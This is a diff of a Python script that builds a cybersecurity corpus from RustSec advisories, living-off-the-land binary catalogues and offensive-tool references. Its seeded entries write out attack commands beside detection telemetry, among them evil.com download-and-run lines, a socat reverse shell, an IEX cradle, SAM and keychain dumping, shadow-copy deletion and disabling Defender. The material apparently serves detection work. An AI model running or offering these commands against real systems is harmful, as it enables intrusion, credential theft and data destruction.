@@ -17,7 +17,6 @@ import json
 import logging
 import os
 import re
-import sys
 import tarfile
 from datetime import datetime
 from pathlib import Path
@@ -25,9 +24,7 @@ from typing import Any
 
 import requests
 import yaml
-from bs4 import BeautifulSoup
 from cache_utils import CachedSession
-from tqdm import tqdm
 
 # Configure logging
 logging.basicConfig(
@@ -199,8 +196,12 @@ class CybersecCollector:
                     continue
 
                 meta, body = parse_frontmatter(text)
-                adv_info = meta.get("advisory", {}) if isinstance(meta.get("advisory"), dict) else meta
-                ver_info = meta.get("versions", {}) if isinstance(meta.get("versions"), dict) else {}
+                adv_info = (
+                    meta.get("advisory", {}) if isinstance(meta.get("advisory"), dict) else meta
+                )
+                ver_info = (
+                    meta.get("versions", {}) if isinstance(meta.get("versions"), dict) else {}
+                )
 
                 adv_id = adv_info.get("id") or Path(member.name).stem
                 package = adv_info.get("package") or Path(member.name).parent.name
@@ -253,7 +254,9 @@ class CybersecCollector:
                 count += 1
             archive.close()
         else:
-            logger.warning("Could not download RustSec tarball; generating foundational RustSec corpus.")
+            logger.warning(
+                "Could not download RustSec tarball; generating foundational RustSec corpus."
+            )
             count += self._seed_core_rustsec_advisories(out_dir)
 
         logger.info(f"Collected {count} RustSec advisories.")
@@ -354,14 +357,18 @@ class CybersecCollector:
         # 1. LOLBAS (Windows)
         lolbas_cfg = lotl_cfg.get("lolbas", {})
         win_dir = self.output_base / "lotl" / "windows"
-        archive = self._fetch_repo_archive(lolbas_cfg.get("repo", "LOLBAS-Project/LOLBAS"), lolbas_cfg.get("branch", "master"))
+        archive = self._fetch_repo_archive(
+            lolbas_cfg.get("repo", "LOLBAS-Project/LOLBAS"), lolbas_cfg.get("branch", "master")
+        )
         if archive:
             for member in archive.getmembers():
                 if not member.isfile():
                     continue
                 if not (member.name.endswith(".yml") or member.name.endswith(".yaml")):
                     continue
-                if not any(k in member.name for k in ["/OSBinaries/", "/OSLibraries/", "/OSScripts/"]):
+                if not any(
+                    k in member.name for k in ["/OSBinaries/", "/OSLibraries/", "/OSScripts/"]
+                ):
                     continue
 
                 f = archive.extractfile(member)
@@ -428,10 +435,16 @@ class CybersecCollector:
         # 2. GTFOBins (Linux)
         gtfo_cfg = lotl_cfg.get("gtfobins", {})
         linux_dir = self.output_base / "lotl" / "linux"
-        archive = self._fetch_repo_archive(gtfo_cfg.get("repo", "GTFOBins/GTFOBins.github.io"), gtfo_cfg.get("branch", "master"))
+        archive = self._fetch_repo_archive(
+            gtfo_cfg.get("repo", "GTFOBins/GTFOBins.github.io"), gtfo_cfg.get("branch", "master")
+        )
         if archive:
             for member in archive.getmembers():
-                if not member.isfile() or "/_gtfobins/" not in member.name or not member.name.endswith(".md"):
+                if (
+                    not member.isfile()
+                    or "/_gtfobins/" not in member.name
+                    or not member.name.endswith(".md")
+                ):
                     continue
                 f = archive.extractfile(member)
                 if not f:
@@ -442,7 +455,9 @@ class CybersecCollector:
                     continue
                 meta, body = parse_frontmatter(text)
                 bin_name = Path(member.name).stem
-                functions = meta.get("functions", {}) if isinstance(meta.get("functions"), dict) else {}
+                functions = (
+                    meta.get("functions", {}) if isinstance(meta.get("functions"), dict) else {}
+                )
 
                 fn_text = ""
                 for fn_name, fn_list in functions.items():
@@ -490,7 +505,9 @@ class CybersecCollector:
         # 3. LOOBins (macOS)
         loobins_cfg = lotl_cfg.get("loobins", {})
         macos_dir = self.output_base / "lotl" / "macos"
-        archive = self._fetch_repo_archive(loobins_cfg.get("repo", "infosecb/LOOBins"), loobins_cfg.get("branch", "main"))
+        archive = self._fetch_repo_archive(
+            loobins_cfg.get("repo", "infosecb/LOOBins"), loobins_cfg.get("branch", "main")
+        )
         if archive:
             for member in archive.getmembers():
                 if not member.isfile() or not member.name.endswith(".md"):
@@ -513,7 +530,7 @@ class CybersecCollector:
                     f"## Capability & Usage Details\n{body}\n\n"
                     f"## Detection & Telemetry\n"
                     f"- Endpoint Security Framework (ESF) events: ES_EVENT_TYPE_NOTIFY_EXEC\n"
-                    f"- Unified Logging predicate: `process == \"{name}\"`\n"
+                    f'- Unified Logging predicate: `process == "{name}"`\n'
                 )
                 self._save_raw_json(
                     subdir=macos_dir,
@@ -539,18 +556,55 @@ class CybersecCollector:
         ps_dir = self.output_base / "lotl" / "powershell"
         count += self._seed_powershell_admin_lotl(ps_dir)
 
-        logger.info(f"Collected {count} Living-Off-The-Land (LOTL) entries across Windows, Linux, and macOS.")
+        logger.info(
+            f"Collected {count} Living-Off-The-Land (LOTL) entries across Windows, Linux, and macOS."
+        )
         return count
 
     def _seed_core_windows_lotl(self, win_dir: Path) -> int:
         entries = [
-            ("certutil.exe", "Download, encode/decode base64, hash calculation", "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe", "Event ID 4688, Sysmon Event ID 1 (filter -urlcache)"),
-            ("bitsadmin.exe", "Background intelligent transfer of remote binaries", "bitsadmin /transfer job /download /priority high http://evil.com/p.exe C:\\p.exe", "Microsoft-Windows-Bits-Client/Operational Event ID 59"),
-            ("rundll32.exe", "Execute arbitrary DLL exports or scriptlets", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();", "Event ID 4688, Sysmon Event ID 1, network connections from rundll32.exe"),
-            ("mshta.exe", "Execute HTML Applications (HTA) and VBScript/JScript", "mshta.exe http://evil.com/payload.hta", "Event ID 4688, network connections initiated by mshta.exe"),
-            ("wmic.exe", "WMI process creation and lateral movement", "wmic process call create \"calc.exe\"", "Event ID 4688, WMI-Activity Event ID 5861"),
-            ("reg.exe", "Registry query, persistence modification, SAM export", "reg save HKLM\\SAM C:\\sam.hive", "Event ID 4688, Registry auditing Event ID 4657"),
-            ("vssadmin.exe", "Shadow copy deletion for anti-forensics / ransomware", "vssadmin delete shadows /all /quiet", "Event ID 4688 with 'delete shadows' alert rule"),
+            (
+                "certutil.exe",
+                "Download, encode/decode base64, hash calculation",
+                "certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe",
+                "Event ID 4688, Sysmon Event ID 1 (filter -urlcache)",
+            ),
+            (
+                "bitsadmin.exe",
+                "Background intelligent transfer of remote binaries",
+                "bitsadmin /transfer job /download /priority high http://evil.com/p.exe C:\\p.exe",
+                "Microsoft-Windows-Bits-Client/Operational Event ID 59",
+            ),
+            (
+                "rundll32.exe",
+                "Execute arbitrary DLL exports or scriptlets",
+                'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();',
+                "Event ID 4688, Sysmon Event ID 1, network connections from rundll32.exe",
+            ),
+            (
+                "mshta.exe",
+                "Execute HTML Applications (HTA) and VBScript/JScript",
+                "mshta.exe http://evil.com/payload.hta",
+                "Event ID 4688, network connections initiated by mshta.exe",
+            ),
+            (
+                "wmic.exe",
+                "WMI process creation and lateral movement",
+                'wmic process call create "calc.exe"',
+                "Event ID 4688, WMI-Activity Event ID 5861",
+            ),
+            (
+                "reg.exe",
+                "Registry query, persistence modification, SAM export",
+                "reg save HKLM\\SAM C:\\sam.hive",
+                "Event ID 4688, Registry auditing Event ID 4657",
+            ),
+            (
+                "vssadmin.exe",
+                "Shadow copy deletion for anti-forensics / ransomware",
+                "vssadmin delete shadows /all /quiet",
+                "Event ID 4688 with 'delete shadows' alert rule",
+            ),
         ]
         for name, desc, cmd, det in entries:
             content = (
@@ -576,11 +630,36 @@ class CybersecCollector:
 
     def _seed_core_linux_lotl(self, linux_dir: Path) -> int:
         entries = [
-            ("find", "SUID / Sudo shell escape", "find . -exec /bin/sh -p \\; -quit", "auditd rule: -w /usr/bin/find -p x -k gtfobins_find"),
-            ("awk", "SUID / Sudo shell escape and file read", "awk 'BEGIN {system(\"/bin/sh\")}'", "auditd rule: -w /usr/bin/awk -p x -k gtfobins_awk"),
-            ("tar", "Wildcard injection / checkpoint execution", "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", "auditd command line monitoring for --checkpoint-action"),
-            ("socat", "Reverse TCP shell and port forwarding", "socat tcp-connect:attacker.ip:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane", "Network connection monitoring on unusual egress ports"),
-            ("curl", "Arbitrary file download and piping to shell", "curl -s http://evil.com/setup.sh | bash", "auditd rule: pipe into /bin/bash; inspect command lines"),
+            (
+                "find",
+                "SUID / Sudo shell escape",
+                "find . -exec /bin/sh -p \\; -quit",
+                "auditd rule: -w /usr/bin/find -p x -k gtfobins_find",
+            ),
+            (
+                "awk",
+                "SUID / Sudo shell escape and file read",
+                "awk 'BEGIN {system(\"/bin/sh\")}'",
+                "auditd rule: -w /usr/bin/awk -p x -k gtfobins_awk",
+            ),
+            (
+                "tar",
+                "Wildcard injection / checkpoint execution",
+                "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+                "auditd command line monitoring for --checkpoint-action",
+            ),
+            (
+                "socat",
+                "Reverse TCP shell and port forwarding",
+                "socat tcp-connect:attacker.ip:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane",
+                "Network connection monitoring on unusual egress ports",
+            ),
+            (
+                "curl",
+                "Arbitrary file download and piping to shell",
+                "curl -s http://evil.com/setup.sh | bash",
+                "auditd rule: pipe into /bin/bash; inspect command lines",
+            ),
         ]
         for name, desc, cmd, det in entries:
             content = (
@@ -606,11 +685,36 @@ class CybersecCollector:
 
     def _seed_core_macos_lotl(self, macos_dir: Path) -> int:
         entries = [
-            ("osascript", "AppleScript execution and credential prompt spoofing", "osascript -e 'do shell script \"whoami\" with administrator privileges'", "Endpoint Security ES_EVENT_TYPE_NOTIFY_EXEC for osascript"),
-            ("launchctl", "Persistence via launchdaemons or launchagents", "launchctl load -w /Library/LaunchDaemons/com.malicious.agent.plist", "Monitor file creation in LaunchDaemons / LaunchAgents"),
-            ("defaults", "Reading and modifying hidden plist preferences", "defaults read /Library/Preferences/com.apple.loginwindow", "Audit modifications to loginwindow preferences"),
-            ("security", "Extracting keychain items and certificates", "security dump-keychain -d login.keychain", "Monitor calls to security with dump-keychain or find-generic-password"),
-            ("csrutil", "Query System Integrity Protection (SIP) status", "csrutil status", "Command-line logging for defense evasion reconnaissance"),
+            (
+                "osascript",
+                "AppleScript execution and credential prompt spoofing",
+                "osascript -e 'do shell script \"whoami\" with administrator privileges'",
+                "Endpoint Security ES_EVENT_TYPE_NOTIFY_EXEC for osascript",
+            ),
+            (
+                "launchctl",
+                "Persistence via launchdaemons or launchagents",
+                "launchctl load -w /Library/LaunchDaemons/com.malicious.agent.plist",
+                "Monitor file creation in LaunchDaemons / LaunchAgents",
+            ),
+            (
+                "defaults",
+                "Reading and modifying hidden plist preferences",
+                "defaults read /Library/Preferences/com.apple.loginwindow",
+                "Audit modifications to loginwindow preferences",
+            ),
+            (
+                "security",
+                "Extracting keychain items and certificates",
+                "security dump-keychain -d login.keychain",
+                "Monitor calls to security with dump-keychain or find-generic-password",
+            ),
+            (
+                "csrutil",
+                "Query System Integrity Protection (SIP) status",
+                "csrutil status",
+                "Command-line logging for defense evasion reconnaissance",
+            ),
         ]
         for name, desc, cmd, det in entries:
             content = (
@@ -636,12 +740,42 @@ class CybersecCollector:
 
     def _seed_powershell_admin_lotl(self, ps_dir: Path) -> int:
         entries = [
-            ("Invoke-WebRequest", "Web download cradle (IEX)", "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1'); Invoke-WebRequest -Uri http://evil.com/f.exe -OutFile C:\\f.exe", "PowerShell Event ID 4104 (ScriptBlock Logging), Event ID 4103, Sysmon Event ID 22 (DNS)"),
-            ("Start-Process", "Process invocation with alternative credentials or hidden windows", "Start-Process -FilePath 'powershell.exe' -ArgumentList '-WindowStyle Hidden -NoP -Enc <BASE64>'", "Event ID 4688 with -WindowStyle Hidden arguments"),
-            ("Get-CimInstance", "WMI/CIM reconnaissance for AV/EDR detection and OS queries", "Get-CimInstance -ClassName Win32_Product; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct", "PowerShell Event ID 4104 for AntiVirusProduct queries"),
-            ("Set-MpPreference", "Disabling Windows Defender features or adding exclusion paths", "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\Temp'", "Microsoft-Windows-Windows Defender/Operational Event ID 5007"),
-            ("New-Service", "Creating Windows services for SYSTEM-level persistence", "New-Service -Name 'UpdateSvc' -BinaryPathName 'C:\\Windows\\Temp\\svc.exe' -StartupType Automatic", "System Event ID 7045 (A new service was installed in the system)"),
-            ("Invoke-Expression", "Dynamic in-memory code execution (IEX)", "Invoke-Expression (Get-Content C:\\payload.ps1 -Raw)", "PowerShell Event ID 4104 showing dynamic invocation"),
+            (
+                "Invoke-WebRequest",
+                "Web download cradle (IEX)",
+                "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1'); Invoke-WebRequest -Uri http://evil.com/f.exe -OutFile C:\\f.exe",
+                "PowerShell Event ID 4104 (ScriptBlock Logging), Event ID 4103, Sysmon Event ID 22 (DNS)",
+            ),
+            (
+                "Start-Process",
+                "Process invocation with alternative credentials or hidden windows",
+                "Start-Process -FilePath 'powershell.exe' -ArgumentList '-WindowStyle Hidden -NoP -Enc <BASE64>'",
+                "Event ID 4688 with -WindowStyle Hidden arguments",
+            ),
+            (
+                "Get-CimInstance",
+                "WMI/CIM reconnaissance for AV/EDR detection and OS queries",
+                "Get-CimInstance -ClassName Win32_Product; Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct",
+                "PowerShell Event ID 4104 for AntiVirusProduct queries",
+            ),
+            (
+                "Set-MpPreference",
+                "Disabling Windows Defender features or adding exclusion paths",
+                "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\Temp'",
+                "Microsoft-Windows-Windows Defender/Operational Event ID 5007",
+            ),
+            (
+                "New-Service",
+                "Creating Windows services for SYSTEM-level persistence",
+                "New-Service -Name 'UpdateSvc' -BinaryPathName 'C:\\Windows\\Temp\\svc.exe' -StartupType Automatic",
+                "System Event ID 7045 (A new service was installed in the system)",
+            ),
+            (
+                "Invoke-Expression",
+                "Dynamic in-memory code execution (IEX)",
+                "Invoke-Expression (Get-Content C:\\payload.ps1 -Raw)",
+                "PowerShell Event ID 4104 showing dynamic invocation",
+            ),
         ]
         for name, desc, cmd, det in entries:
             content = (
@@ -688,10 +822,19 @@ class CybersecCollector:
                     ("-sC", "Run default NSE scripts (equivalent to --script=default)"),
                     ("-p <range>", "Specify ports (e.g. -p 1-65535, -p-, -p 22,80,443,U:53)"),
                     ("-O", "Enable OS detection using TCP/IP fingerprinting"),
-                    ("-T<0-5>", "Timing template (T0=paranoid, T1=sneaky, T2=polite, T3=normal, T4=aggressive, T5=insane)"),
+                    (
+                        "-T<0-5>",
+                        "Timing template (T0=paranoid, T1=sneaky, T2=polite, T3=normal, T4=aggressive, T5=insane)",
+                    ),
                     ("-Pn", "Treat all hosts as online (skip host discovery / ping probe)"),
-                    ("-oA <basename>", "Output scan in normal, XML, and grepable formats simultaneously"),
-                    ("--script <scripts>", "Run NSE scripts (e.g. vuln, safe, default, auth, discovery, smb-vuln-ms17-010)"),
+                    (
+                        "-oA <basename>",
+                        "Output scan in normal, XML, and grepable formats simultaneously",
+                    ),
+                    (
+                        "--script <scripts>",
+                        "Run NSE scripts (e.g. vuln, safe, default, auth, discovery, smb-vuln-ms17-010)",
+                    ),
                     ("--script-args <args>", "Pass arguments to NSE scripts"),
                 ],
                 "examples": [
@@ -706,7 +849,10 @@ class CybersecCollector:
                 "description": "Asynchronous TCP port scanner capable of scanning the entire Internet in under 6 minutes at 10 million packets per second using custom network driver bypasses.",
                 "flags": [
                     ("-p <ports>", "Target ports (e.g. -p 80,443 or -p 0-65535)"),
-                    ("--rate <pps>", "Set transmission rate in packets per second (e.g. --rate 10000)"),
+                    (
+                        "--rate <pps>",
+                        "Set transmission rate in packets per second (e.g. --rate 10000)",
+                    ),
                     ("--range <cidrs>", "Target CIDR blocks"),
                     ("--exclude <ip>", "Blacklist IP range from scan"),
                     ("-oL <file>", "Output in list format"),
@@ -726,11 +872,20 @@ class CybersecCollector:
                     ("dns", "DNS subdomain enumeration mode"),
                     ("vhost", "Virtual host enumeration mode"),
                     ("-u, --url <url>", "Target URL"),
-                    ("-w, --wordlist <path>", "Path to wordlist (e.g. /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)"),
-                    ("-x, --extensions <exts>", "File extensions to search (e.g. -x php,html,txt,json,bak)"),
+                    (
+                        "-w, --wordlist <path>",
+                        "Path to wordlist (e.g. /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)",
+                    ),
+                    (
+                        "-x, --extensions <exts>",
+                        "File extensions to search (e.g. -x php,html,txt,json,bak)",
+                    ),
                     ("-t, --threads <int>", "Number of concurrent threads (default: 10)"),
                     ("-k, --no-tls-validation", "Skip TLS certificate verification"),
-                    ("-s, --status-codes <codes>", "Positive status codes (default: 200,204,301,302,307,401,403)"),
+                    (
+                        "-s, --status-codes <codes>",
+                        "Positive status codes (default: 200,204,301,302,307,401,403)",
+                    ),
                     ("-b, --status-codes-blacklist <codes>", "Negative status codes to filter out"),
                     ("-o, --output <file>", "Output file for findings"),
                 ],
@@ -746,7 +901,10 @@ class CybersecCollector:
                 "description": "High-performance web fuzzer written in Go for discovering endpoints, GET/POST parameters, headers, and vhosts.",
                 "flags": [
                     ("-u <url>", "Target URL containing FUZZ keyword (e.g. http://site.com/FUZZ)"),
-                    ("-w <path>", "Wordlist path with optional keyword mapping (e.g. wordlist.txt:FUZZ)"),
+                    (
+                        "-w <path>",
+                        "Wordlist path with optional keyword mapping (e.g. wordlist.txt:FUZZ)",
+                    ),
                     ("-X <method>", "HTTP method (GET, POST, PUT, DELETE, OPTIONS)"),
                     ("-d <data>", "POST data with FUZZ payload"),
                     ("-H <header>", "HTTP header (e.g. -H 'Host: FUZZ.domain.com')"),
@@ -777,10 +935,22 @@ class CybersecCollector:
                     ("-T <table>", "Target table name"),
                     ("-C <columns>", "Target column names"),
                     ("--batch", "Never ask for user input; accept default answers"),
-                    ("--level <1-5>", "Level of tests to perform (1=standard, 5=extensive HTTP headers/cookies)"),
-                    ("--risk <1-3>", "Risk of tests to perform (1=safe, 3=includes OR-based and heavy UPDATE/DELETE risks)"),
-                    ("--os-shell", "Prompt for an interactive operating system shell if DB permissions permit"),
-                    ("--tamper <scripts>", "Use evasion tamper scripts (e.g. --tamper=space2comment,between)"),
+                    (
+                        "--level <1-5>",
+                        "Level of tests to perform (1=standard, 5=extensive HTTP headers/cookies)",
+                    ),
+                    (
+                        "--risk <1-3>",
+                        "Risk of tests to perform (1=safe, 3=includes OR-based and heavy UPDATE/DELETE risks)",
+                    ),
+                    (
+                        "--os-shell",
+                        "Prompt for an interactive operating system shell if DB permissions permit",
+                    ),
+                    (
+                        "--tamper <scripts>",
+                        "Use evasion tamper scripts (e.g. --tamper=space2comment,between)",
+                    ),
                 ],
                 "examples": [
                     "sqlmap -r request.txt --dbs --batch --level 3 --risk 2",
@@ -800,7 +970,10 @@ class CybersecCollector:
                     ("-s <port>", "Non-default service port"),
                     ("-t <tasks>", "Number of parallel threads/tasks per host (default: 16)"),
                     ("-v / -V", "Verbose output / show login+pass for each attempt"),
-                    ("-e nsr", "Additional checks: 'n' null password, 's' login as pass, 'r' reversed login"),
+                    (
+                        "-e nsr",
+                        "Additional checks: 'n' null password, 's' login as pass, 'r' reversed login",
+                    ),
                     ("-f", "Exit after first found valid login/password pair"),
                 ],
                 "examples": [
@@ -814,8 +987,14 @@ class CybersecCollector:
                 "synopsis": "hashcat [options] hashfile [mask|wordlists|directories]",
                 "description": "World's fastest rule-based and mask password recovery engine supporting hundreds of hash types and OpenCL/CUDA acceleration.",
                 "flags": [
-                    ("-m <hash_type>", "Hash type code: 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA512(Unix), 3200=bcrypt, 13100=Kerberoast SPN"),
-                    ("-a <attack_mode>", "Attack mode: 0=Straight/Dictionary, 1=Combination, 3=Brute-force/Mask, 6=Hybrid Dict+Mask, 7=Hybrid Mask+Dict"),
+                    (
+                        "-m <hash_type>",
+                        "Hash type code: 0=MD5, 100=SHA1, 1000=NTLM, 1800=SHA512(Unix), 3200=bcrypt, 13100=Kerberoast SPN",
+                    ),
+                    (
+                        "-a <attack_mode>",
+                        "Attack mode: 0=Straight/Dictionary, 1=Combination, 3=Brute-force/Mask, 6=Hybrid Dict+Mask, 7=Hybrid Mask+Dict",
+                    ),
                     ("-r <rule_file>", "Apply hashcat rules (e.g. -r rules/best64.rule)"),
                     ("-o <outfile>", "Save cracked hashes to file"),
                     ("--show", "Display cracked passwords from potfile"),
@@ -832,8 +1011,14 @@ class CybersecCollector:
                 "synopsis": "msfvenom [options] -p <payload> [VAR=VAL]",
                 "description": "Metasploit standalone payload generator creating staged/stageless shellcode, executables, and DLLs for multi-architecture exploitation.",
                 "flags": [
-                    ("-p, --payload <payload>", "Metasploit payload (e.g. windows/x64/meterpreter/reverse_tcp, linux/x64/shell_reverse_tcp)"),
-                    ("-f, --format <format>", "Output format: raw, elf, exe, dll, c, python, ps1, war, aspx"),
+                    (
+                        "-p, --payload <payload>",
+                        "Metasploit payload (e.g. windows/x64/meterpreter/reverse_tcp, linux/x64/shell_reverse_tcp)",
+                    ),
+                    (
+                        "-f, --format <format>",
+                        "Output format: raw, elf, exe, dll, c, python, ps1, war, aspx",
+                    ),
                     ("-e, --encoder <encoder>", "Encoder module (e.g. x86/shikata_ga_nai)"),
                     ("-b, --bad-chars <chars>", "Characters to avoid (e.g. -b '\\x00\\x0a\\x0d')"),
                     ("-i, --iterations <count>", "Encoding rounds"),
@@ -852,14 +1037,35 @@ class CybersecCollector:
                 "synopsis": "impacket-<script> [options] target",
                 "description": "Collection of Python classes for working with network protocols (SMB, MSRPC, Kerberos, LDAP, MSSQL) used extensively for lateral movement and credential dumping.",
                 "flags": [
-                    ("secretsdump.py", "Dumps NTLM hashes from NTDS.dit, SAM hive, LSA secrets, and cached domain credentials"),
+                    (
+                        "secretsdump.py",
+                        "Dumps NTLM hashes from NTDS.dit, SAM hive, LSA secrets, and cached domain credentials",
+                    ),
                     ("psexec.py", "Executes commands via RemComSvc with administrative SMB access"),
-                    ("wmiexec.py", "Executes semi-interactive shell via WMI (less noisy than psexec, no service creation)"),
-                    ("smbexec.py", "Executes commands via native BITS or service controller without uploading binaries"),
-                    ("GetNPUsers.py", "AS-REP Roasting against accounts with 'Do not require Kerberos preauthentication'"),
-                    ("GetUserSPNs.py", "Kerberoasting against Service Principal Names (SPNs) for offline cracking"),
-                    ("-hashes <LM:NT>", "Authenticate using Pass-the-Hash instead of plaintext password"),
-                    ("-k", "Authenticate using Kerberos ticket (requires KRB5CCNAME environment variable)"),
+                    (
+                        "wmiexec.py",
+                        "Executes semi-interactive shell via WMI (less noisy than psexec, no service creation)",
+                    ),
+                    (
+                        "smbexec.py",
+                        "Executes commands via native BITS or service controller without uploading binaries",
+                    ),
+                    (
+                        "GetNPUsers.py",
+                        "AS-REP Roasting against accounts with 'Do not require Kerberos preauthentication'",
+                    ),
+                    (
+                        "GetUserSPNs.py",
+                        "Kerberoasting against Service Principal Names (SPNs) for offline cracking",
+                    ),
+                    (
+                        "-hashes <LM:NT>",
+                        "Authenticate using Pass-the-Hash instead of plaintext password",
+                    ),
+                    (
+                        "-k",
+                        "Authenticate using Kerberos ticket (requires KRB5CCNAME environment variable)",
+                    ),
                 ],
                 "examples": [
                     "impacket-secretsdump DOMAIN/admin:Password@192.168.1.10 -just-dc-ntlm",
@@ -874,7 +1080,10 @@ class CybersecCollector:
                 "description": "LLMNR, NBT-NS and mDNS poisoner with built-in rogue authentication servers (HTTP, SMB, MSSQL, FTP, LDAP) for capturing NetNTLMv1/v2 challenge-response hashes.",
                 "flags": [
                     ("-I <interface>", "Network interface to bind (e.g. -I eth0, -I tun0)"),
-                    ("-w, --wpad", "Start rogue WPAD proxy server for browser credential interception"),
+                    (
+                        "-w, --wpad",
+                        "Start rogue WPAD proxy server for browser credential interception",
+                    ),
                     ("-d, --dhcp", "Inject rogue DHCP responses for WPAD discovery"),
                     ("-v, --verbose", "Verbose mode"),
                     ("-r, --lm", "Enable answers for NetBIOS LM queries"),
@@ -892,8 +1101,14 @@ class CybersecCollector:
                     ("-r <pcap_file>", "Read packet capture file"),
                     ("-i <interface>", "Capture live packets from network interface"),
                     ("-f <bpf_filter>", "BPF capture filter (e.g. 'tcp port 80 or port 443')"),
-                    ("-Y <display_filter>", "Wireshark display filter (e.g. 'http.request.method == POST' or 'kerberos.CNameString')"),
-                    ("-T fields", "Output specific fields (e.g. -T fields -e ip.src -e ip.dst -e http.host)"),
+                    (
+                        "-Y <display_filter>",
+                        "Wireshark display filter (e.g. 'http.request.method == POST' or 'kerberos.CNameString')",
+                    ),
+                    (
+                        "-T fields",
+                        "Output specific fields (e.g. -T fields -e ip.src -e ip.dst -e http.host)",
+                    ),
                     ("-e <field>", "Field to print when -T fields is selected"),
                     ("-z <statistics>", "Display protocol statistics and conversation lists"),
                     ("-w <pcap_file>", "Write live captured packets to file"),
@@ -971,14 +1186,14 @@ class CybersecCollector:
                     "To protect compiled Rust binaries against exploitation, return-oriented programming (ROP), "
                     "stack smashing, and memory corruption in C dependencies or `unsafe` blocks:\n\n"
                     "```bash\n"
-                    "export RUSTFLAGS=\"\\\n"
+                    'export RUSTFLAGS="\\\n'
                     "  -C relro-level=full \\\n"
                     "  -C control-flow-guard \\\n"
                     "  -C overflow-checks=on \\\n"
                     "  -C link-arg=-Wl,-z,relro \\\n"
                     "  -C link-arg=-Wl,-z,now \\\n"
                     "  -C link-arg=-Wl,-z,noexecstack \\\n"
-                    "  -C strip=symbols\"\n"
+                    '  -C strip=symbols"\n'
                     "```\n\n"
                     "### Detailed Flag Analysis:\n"
                     "1. `-C relro-level=full` & `-C link-arg=-Wl,-z,now`: Marks Global Offset Table (GOT) entries as read-only after dynamic loading, preventing GOT overwrite attacks.\n"
@@ -1081,7 +1296,7 @@ class CybersecCollector:
 
     def run_all(self) -> None:
         logger.info("==================================================")
-        logger.info(f" Starting Cybersecurity Intelligence Collection")
+        logger.info(" Starting Cybersecurity Intelligence Collection")
         logger.info(f" Knowledge Cutoff Date: {self.cutoff_date}")
         logger.info("==================================================")
 
@@ -1092,7 +1307,7 @@ class CybersecCollector:
 
         total = rustsec_count + lotl_count + kali_count + hardening_count
         logger.info("==================================================")
-        logger.info(f" Cybersec Collection Summary:")
+        logger.info(" Cybersec Collection Summary:")
         logger.info(f"   RustSec Advisories:        {rustsec_count}")
         logger.info(f"   Living-off-the-land:       {lotl_count}")
         logger.info(f"   Kali Linux Tools:          {kali_count}")
